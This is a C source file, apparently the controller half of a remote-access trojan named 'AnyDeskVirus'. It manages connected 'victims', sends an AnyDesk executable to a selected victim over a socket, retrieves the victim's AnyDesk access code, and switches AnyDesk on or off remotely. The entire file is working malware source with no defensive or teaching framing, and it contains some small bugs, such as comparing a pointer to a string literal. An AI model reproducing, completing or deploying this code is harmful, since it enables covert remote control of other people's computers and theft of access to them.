#include <Windows.h>
#include <stdio.h>

#define ANYDESK_FILE_PATH "C:\\Users\\Matan\\Documents\\CProjects\\AnyDeskVirus\\anyDeskFile\\AnyDesk.exe"
#define BUFFER_SIZE 1024
#define ANYDESK_CODE_ERROR "no-code__" // The code has to be 9 digits

// Functions
void displayHelp();
void installAnyDesk(int victimSocket);
char* getCode(int victimSocket);
void send_file(char* filePath, int socket);
void powerOffAnyDesk(int victimSocket);
void powerOnAnyDesk(int victimSocket);

void displayHelp()
{
    /*
    Prints help menu
    */

    printf("\n\thelp - this command\n\n\t-- Before selecting victim --\n\tvictims - prints how much victim's connected\n\tselect [index] - selects the victim's object from [connectedVictims] on [index] to apply commands to it\n\n\t-- After selecting victim\n\tinstall - installs anydesk on his pc\n\tcode - returns her anydesk code\n");
}

void installAnyDesk(int victimSocket)
{
    /*
    The func installs anydesk on the victim's pc

    param 1: the socket descreption of the socket with the victim
    */

    int command, ANYDESK_FILE_SIZE, ANYDESK_FILE_SIZE_BIG_ENDIAN, totalRead;
    char* victimAnydeskCode; // The anydesk code of the victim

    printf("Installing...\n");

    // Sends the command
    command = 0;
    command = htonl(command);
    send(victimSocket, (char*)&command, sizeof(command), 0);

    // Sends the anydesk file
    send_file(ANYDESK_FILE_PATH, victimSocket);

    printf("The Installing has been successfully completed!\n");

    victimAnydeskCode = getCode(victimSocket);
    if (victimAnydeskCode == ANYDESK_CODE_ERROR)
    {
        printf("There is no code...\n");
    }
    else
    {
        printf("The victim anydesk code is: %s\n", victimAnydeskCode);
    }

    free(victimAnydeskCode);
}

void send_file(char* filePath, int socket)
{
    FILE* fp;
    char buffer[BUFFER_SIZE] = { 0 };
    int fileSize, sentBytesAmount, totalRead = 0, readBytes;

    fp = fopen(filePath, "rb");
    if (fp == NULL)
    {
        printf("Error in file reading!");
        exit(1);
    }

    // Gets the file size
    fseek(fp, 0, SEEK_END);
    fileSize = ftell(fp);
    fseek(fp, 0, SEEK_SET); // Seeks to the beginning of the file

    printf("FileSize is %d bytes\n", fileSize);

    // Sends file size
    fileSize = htonl(fileSize); // Converts to big endian
    send(socket, (char*)&fileSize, sizeof(fileSize), 0);

    // Sends the file
    while (totalRead < ntohl(fileSize))
    {
        readBytes = fread(buffer, sizeof(char), sizeof(buffer), fp);
        sentBytesAmount = send(socket, buffer, readBytes, 0);
        if (sentBytesAmount == SOCKET_ERROR)
        {
            printf("Error in file sending! (%d)", GetLastError());
            exit(1);
        }

        totalRead += readBytes;
        printf("sent: %d/%d (%d bytes sent right now)\n", totalRead, ntohl(fileSize), sentBytesAmount);
    }

    fclose(fp);

    printf("File has successfully sent!");
}

char* getCode(int victimSocket)
{
    char* victimAnydeskCode = calloc(9, sizeof(char));
    int command = htonl(1);

    // Sends the command
    send(victimSocket, (char*)&command, sizeof(command), 0);

    printf("Getting the code...\n");
    if (recv(victimSocket, victimAnydeskCode, 9, 0) == SOCKET_ERROR)
        printf("%d", GetLastError());

    return victimAnydeskCode;
}

void powerOnAnyDesk(int victimSocket)
{
    /*
    Powers on anydesk on the victim pc

    param 1: the victim socket
    */
    printf("Powering on...");

    // Sends the command
    int command = htonl(2);
    if (send(victimSocket, (char*)&command, sizeof(command), 0) == SOCKET_ERROR)
    {
        printf("Error in sending the powering on command : %d\n", GetLastError());
        return;
    }

    printf("anydesk has successfully powered on on the victim pc!\n");
}

void powerOffAnyDesk(int victimSocket)
{
    /*
    Powers off anydesk on the victim pc

    param 1: the victim socket
    */
    printf("Powering off...");

    // Sends the command
    int command = htonl(3);
    if (send(victimSocket, (char*)&command, sizeof(command), 0) == SOCKET_ERROR)
    {
        printf("Error in sending the powering off command : %d\n", GetLastError());
        return;
    }

    printf("anydesk has successfully powered off on the victim pc!\n");
}
